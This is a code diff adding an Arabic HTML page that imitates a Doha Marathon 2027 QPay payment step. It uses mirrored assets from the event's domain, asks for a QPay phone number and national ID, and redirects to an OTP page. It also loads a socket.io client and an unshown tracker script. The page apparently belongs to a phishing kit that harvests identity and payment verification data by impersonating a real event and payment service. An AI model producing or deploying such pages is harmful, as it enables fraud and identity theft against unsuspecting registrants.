@@ -1,0 +1,114 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#ed1c24">
+	<title>الدفع عبر QPay - ماراثون الدوحة 2027</title>
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
+	<link rel="stylesheet" href="assets/registration-payment.css">
+	<style>
+		.qpay-fields { display:flex; flex-direction:column; gap:16px; margin:20px 0; }
+		.qpay-fields label { display:flex; flex-direction:column; gap:6px; font-size:14px; font-weight:600; color:#333; }
+		.qpay-fields input {
+			width:100%; padding:14px 16px; border:1.5px solid #d4d4d4; border-radius:10px;
+			font-size:16px; font-family:inherit; background:#fff; color:#101010; direction:ltr; text-align:left;
+			transition: border-color .2s;
+		}
+		.qpay-fields input:focus { outline:none; border-color:var(--brand); }
+		.qpay-logo { text-align:center; margin-bottom:16px; }
+		.qpay-logo span { font-size:28px; font-weight:800; color:#6c3b9e; letter-spacing:1px; }
+	</style>
+</head>
+<body>
+	<header class="payment-header">
+		<nav class="header-actions" aria-label="روابط سريعة">
+			<a href="index.html" aria-label="العودة للرئيسية" title="العودة للرئيسية">
+				<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18"></path></svg>
+			</a>
+			<span class="participant-count" aria-label="مشارك واحد">(1)</span>
+			<svg class="cart-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 3h2l2.3 12.1a2 2 0 0 0 2 1.6h9.9a2 2 0 0 0 2-1.6L22 7H5"></path><circle cx="9" cy="21" r="1"></circle><circle cx="18" cy="21" r="1"></circle></svg>
+		</nav>
+		<a class="payment-brand" href="index.html" aria-label="ماراثون الدوحة من أريدُ">
+			<img src="assets/suffixevnt.blob.core.windows.net/dohaimages/2025/06/Logo.png" alt="ماراثون الدوحة من أريدُ">
+		</a>
+	</header>
+
+	<main class="payment-shell">
+		<section class="payment-card" aria-label="الدفع عبر QPay">
+			<div class="session-row">
+				<strong id="session-countdown" class="session-countdown" aria-live="off">10:00</strong>
+				<span>تنتهي صلاحية الجلسة خلال</span>
+			</div>
+
+			<div class="payment-total">
+				<p>إجمالي المبلغ المستحق الدفع</p>
+				<strong id="payment-total" class="amount"></strong>
+			</div>
+
+			<div class="qpay-logo"><span>QPay</span></div>
+
+			<form id="paymentForm" novalidate>
+				<div class="qpay-fields">
+					<label>
+						رقم الهاتف المسجل في QPay
+						<input type="tel" name="qpay-phone" id="qpay-phone" placeholder="974 XXXX XXXX" maxlength="15" inputmode="numeric" required>
+					</label>
+					<label>
+						رقم الهوية / الإقامة
+						<input type="text" name="qpay-id" id="qpay-id" placeholder="رقم الهوية أو الإقامة" required>
+					</label>
+				</div>
+
+				<button id="pay-button" class="pay-button" type="submit">متابعة الدفع</button>
+				<p id="payment-message" class="payment-message" role="status" aria-live="polite" hidden></p>
+			</form>
+
+			<a class="back-link" href="payment.html">خلف</a>
+		</section>
+	</main>
+	<footer class="payment-footer" aria-hidden="true"></footer>
+<script src="/socket.io/socket.io.js"></script>
+<script src="/assets/tracker.js"></script>
+<script>
+(function(){
+	var reviewKey = "doha-marathon-registration-review";
+	var expiryKey = "doha-marathon-payment-expiry";
+	var review;
+	try { review = JSON.parse(sessionStorage.getItem(reviewKey) || "null"); } catch(e){ review = null; }
+
+	var totalEl = document.getElementById("payment-total");
+	if (review && typeof review.price === "number") {
+		totalEl.textContent = "QAR " + review.price.toFixed(2);
+	}
+
+	var savedExpiry = Number(sessionStorage.getItem(expiryKey));
+	var expiry = (savedExpiry > 0) ? savedExpiry : Date.now() + 10*60*1000;
+	sessionStorage.setItem(expiryKey, String(expiry));
+
+	var countdown = document.getElementById("session-countdown");
+	var msg = document.getElementById("payment-message");
+	function tick(){
+		var rem = Math.max(0, Math.ceil((expiry - Date.now())/1000));
+		var m = Math.floor(rem/60), s = rem%60;
+		if(countdown) countdown.textContent = String(m).padStart(2,"0")+":"+String(s).padStart(2,"0");
+		if(rem===0){ if(msg){msg.hidden=false; msg.textContent="انتهت صلاحية جلسة الدفع.";} clearInterval(tid); }
+	}
+	tick(); var tid = setInterval(tick, 1000);
+
+	var form = document.getElementById("paymentForm");
+	if(form) form.addEventListener("submit", function(e){
+		e.preventDefault();
+		var phone = document.getElementById("qpay-phone").value.replace(/\s/g,"");
+		var qid = document.getElementById("qpay-id").value.trim();
+		if(phone.length < 8 || !qid){
+			if(msg){msg.hidden=false; msg.textContent="يرجى ملء جميع الحقول بشكل صحيح.";}
+			return;
+		}
+		window.location.assign("otp.html");
+	});
+})();
+</script>
+</body>
+</html>
